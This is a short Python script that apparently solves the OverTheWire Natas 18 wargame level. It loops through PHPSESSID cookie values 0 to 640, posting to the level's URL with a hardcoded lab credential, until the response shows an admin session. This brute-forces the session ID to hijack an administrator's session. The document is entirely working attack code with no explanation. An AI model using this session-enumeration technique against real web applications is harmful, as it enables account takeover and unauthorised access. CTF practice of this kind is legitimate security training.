import requests
from requests.auth import HTTPBasicAuth
import string


for i in range(641):
    # print (checking)
    payload = { "username": "admin", "password": "bitch" }
    cookie = { "PHPSESSID": str(i) }
    print ("Checking: " + str(i))
    res = requests.post("http://natas18.natas.labs.overthewire.org/?debug=true", data=payload, auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies=cookie)
    # print (res.elapsed.total_seconds())
    
    if ("You are an admin" in res.text):
        print (res.text)
        print(i)
        break
 
       